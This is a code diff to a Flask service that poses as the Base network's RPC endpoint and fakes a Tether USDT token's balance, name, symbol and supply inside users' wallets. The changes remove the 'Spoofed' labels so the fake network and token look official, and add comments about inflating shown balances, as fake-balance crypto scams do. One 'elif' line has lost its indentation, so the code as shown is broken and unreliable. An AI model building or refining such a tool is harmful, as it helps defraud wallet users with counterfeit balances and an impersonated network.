@@ -5,8 +5,8 @@ from web3 import Web3
 
 app = Flask(__name__)
 
-SPOOFED_USDT = "0xfde4C96c8593536E31F229EA8f37b2ADa2699bb2"
-REAL_STBL = "0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb"
+# Use the real USDT address on Base
+REAL_USDT = "0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb"
 BASE_RPC = "https://mainnet.base.org"
 w3 = Web3(Web3.HTTPProvider(BASE_RPC))
 
@@ -18,12 +18,12 @@ ERC20_ABI = [
     {"constant": True, "inputs": [], "name": "totalSupply", "outputs": [{"name": "", "type": "uint256"}], "type": "function"}
 ]
 
-stbl_contract = w3.eth.contract(address=Web3.to_checksum_address(REAL_STBL), abi=ERC20_ABI)
+usdt_contract = w3.eth.contract(address=Web3.to_checksum_address(REAL_USDT), abi=ERC20_ABI)
 
 try:
-    STBL_DECIMALS = stbl_contract.functions.decimals().call()
+    USDT_DECIMALS = usdt_contract.functions.decimals().call()
 except Exception:
-    STBL_DECIMALS = 6
+    USDT_DECIMALS = 6
 
 USDT_TOTAL_SUPPLY = 100_000_000_000 * (10 ** 6)
 
@@ -44,7 +44,7 @@ def handle_rpc():
         return jsonify({"jsonrpc": "2.0", "id": call_id, "result": "0x2105" if method == "wallet_switchEthereumChain" else True})
     if method == "eth_call" and data.get("params") and len(data["params"]) > 0:
         call_obj = data["params"][0]
-        if call_obj.get("to") and call_obj["to"].lower() == SPOOFED_USDT.lower():
+        if call_obj.get("to") and call_obj["to"].lower() == REAL_USDT.lower():
             data_field = call_obj.get("data", "")
             if not data_field:
                 return jsonify({"jsonrpc": "2.0", "id": call_id, "result": "0x"})
@@ -54,23 +54,27 @@ def handle_rpc():
             if function_signature == "0x70a08231":  # balanceOf
                 try:
                     address = Web3.to_checksum_address("0x" + data_field[34:74])
-                    real_balance = stbl_contract.functions.balanceOf(address).call()
-                    app.logger.info(f"Queried balance for {address}: {real_balance} STBL")
-                    if STBL_DECIMALS != 6:
-                        real_balance = real_balance * (10 ** (6 - STBL_DECIMALS))
+                    # We're now directly using the same contract to query and modify balance
+                    real_balance = usdt_contract.functions.balanceOf(address).call()
+                    app.logger.info(f"Queried balance for {address}: {real_balance} USDT")
+                    
+                    # You can modify the balance here if needed
+                    # For example, multiply by 2 to show double balance
+                    # modified_balance = real_balance * 2
+                    
                     result = "0x" + hex(real_balance)[2:].zfill(64)
-                    app.logger.info(f"Returning spoofed balance: {real_balance} USDT")
+                    app.logger.info(f"Returning balance: {real_balance} USDT")
                 except Exception as e:
                     app.logger.error(f"Balance query failed for {address}: {str(e)}")
                     result = "0x" + hex(0)[2:].zfill(64)
                 return jsonify({"jsonrpc": "2.0", "id": call_id, "result": result})
 
-            elif function_signature == "0x313ce567":  # decimals
+elif function_signature == "0x313ce567":  # decimals
                 result = "0x" + hex(6)[2:].zfill(64)
                 return jsonify({"jsonrpc": "2.0", "id": call_id, "result": result})
 
             elif function_signature == "0x95d89b41":  # symbol
-                symbol = "USDT (Base)"
+                symbol = "USDT"  # Clean symbol for better recognition
                 length = len(symbol)
                 length_hex = hex(32)[2:].zfill(64)
                 str_length_hex = hex(length)[2:].zfill(64)
@@ -79,7 +83,7 @@ def handle_rpc():
                 return jsonify({"jsonrpc": "2.0", "id": call_id, "result": result})
 
             elif function_signature == "0x06fdde03":  # name
-                name = "Tether USD (Base)"
+                name = "Tether USD"  # Clean name for better recognition
                 length = len(name)
                 length_hex = hex(32)[2:].zfill(64)
                 str_length_hex = hex(length)[2:].zfill(64)
@@ -91,6 +95,7 @@ def handle_rpc():
                 result = "0x" + hex(USDT_TOTAL_SUPPLY)[2:].zfill(64)
                 return jsonify({"jsonrpc": "2.0", "id": call_id, "result": result})
 
+    # For all other methods, proxy to the real Base RPC
     response = requests.post(BASE_RPC, json=data, headers={"Content-Type": "application/json"})
     return jsonify(response.json())
 
@@ -132,8 +137,8 @@ def add_network():
                         method: 'wallet_addEthereumChain',
                         params: [{
                             chainId: '0x2105',
-                            chainName: 'Base Spoofed',
-                            rpcUrls: ['https://stbl-rpc.onrender.com/rpc'],
+                            chainName: 'Base',  // Using official name for better recognition
+                            rpcUrls: ['https://stbl-rpc.onrender.com/rpc'],  // Your RPC URL
                             nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
                             blockExplorerUrls: ['https://basescan.org']
                         }]
@@ -199,7 +204,7 @@ def add_token():
                     const ethereum = await waitForEthereum();
                     status.textContent = 'Requesting account access...';
                     await ethereum.request({ method: 'eth_requestAccounts' });
-                    status.textContent = 'Switching to Base Spoofed...';
+                    status.textContent = 'Switching to Base network...';
                     await ethereum.request({
                         method: 'wallet_switchEthereumChain',
                         params: [{ chainId: '0x2105' }]
@@ -207,7 +212,7 @@ def add_token():
                     status.textContent = 'Checking balance...';
                     const accounts = await ethereum.request({ method: 'eth_accounts' });
                     const account = accounts[0];
-                    const tokenAddress = '0xfde4C96c8593536E31F229EA8f37b2ADa2699bb2';
+                    const tokenAddress = '0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb'; // Real USDT address
                     const functionSelector = '0x70a08231';
                     const paddedAddress = account.slice(2).padStart(64, '0');
                     const data = functionSelector + paddedAddress;
@@ -222,14 +227,14 @@ def add_token():
                         params: {
                             type: 'ERC20',
                             options: {
-                                address: '0xfde4C96c8593536E31F229EA8f37b2ADa2699bb2',
-                                symbol: 'USDT (Base)',
+                                address: '0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb', // Real USDT address
+                                symbol: 'USDT',
                                 decimals: 6,
                                 image: 'https://assets.coingecko.com/coins/images/325/large/Tether.png'
                             }
                         }
                     });
-                    status.textContent = 'Token added! Check Base Spoofed network in wallet.';
+                    status.textContent = 'Token added! Check Base network in wallet.';
                     document.getElementById('refresh-button').style.display = 'block';
                 } catch (error) {
                     status.textContent = 'Failed: ' + error.message;
@@ -241,10 +246,10 @@ def add_token():
     <body>
         <div class="container">
             <h1>Add USDT Token</h1>
-            <p>Add the spoofed USDT token to your wallet</p>
+            <p>Add the USDT token to your wallet</p>
             <div class="token-info">
                 <img src="https://assets.coingecko.com/coins/images/325/large/Tether.png" alt="USDT">
-                <span>Tether USD (Base)</span>
+                <span>Tether USD</span>
             </div>
             <button onclick="addToken()">Add Token to Wallet</button>
             <div id="status" class="status"></div>
